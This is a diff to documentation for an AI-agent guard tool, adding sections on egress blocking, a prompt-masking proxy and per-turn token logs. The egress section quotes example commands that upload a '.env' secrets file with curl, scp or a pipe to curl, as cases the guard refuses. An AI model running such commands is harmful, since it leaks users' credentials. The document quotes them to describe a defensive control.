@@ -68,7 +68,7 @@ A `policy.json` beside your working directory is read when the machine has no fi
 of its own. It may add **rules and nothing else**: it lives in a repository the
 agent can write to, so `selfProtect` and `security` are ignored there.
 
-## The other three layers
+## The other layers
 
 They live in the same file. Wrap the policy and add `security`:
 
@@ -88,6 +88,16 @@ They live in the same file. Wrap the policy and add `security`:
 - **DLP** — when a call carries a secret, refuse it. `dlpBlock` refuses and masks;
   `dlpRedact` alone masks without refusing. 70 built-in patterns, and `custom`
   takes globs of your own. `solongate dlp` lists the names.
+- **Egress** — a transfer command that would upload a local file holding a secret is
+  refused, which pattern DLP cannot catch: `curl --data-binary @.env <url>` reads the
+  file itself, so the secret never appears in the arguments or the output. It reads
+  the file the command names, including a positional one (`scp .env host:/tmp`) and
+  one piped in (`cat .env | curl -d @- <url>`). On with `dlpBlock`.
+- **The prompt** — the model sees your typed prompt and whatever the client sweeps
+  into context, and no tool-call hook is in that path. A shell shim routes `claude`
+  through a local proxy that masks the request body on its way out; the response
+  comes back untouched. Installed with the guard, using the same patterns —
+  `custom` included.
 - **Tamper protection** — the guard's own state is unreachable from a tool call, by
   every route, and cannot be switched off by a policy in a repository. On by
   default; `"selfProtect": false` beside `policy` turns it off.
@@ -101,6 +111,10 @@ writes the rest.
 Recording is not optional — there is nowhere else for an entry to go — so
 `localLogs.path` chooses the folder and nothing more. `solongate audit` reads the
 file, and `solongate audit whitelist <id>` turns a line of it into a rule.
+
+What a turn COST goes beside it, in `token-usage-<date>.jsonl`: one line per turn,
+with the model and the turn id, read from whatever each client already records.
+Nothing counts tokens for you and nothing is sent anywhere.
 
 ## The CLI
 
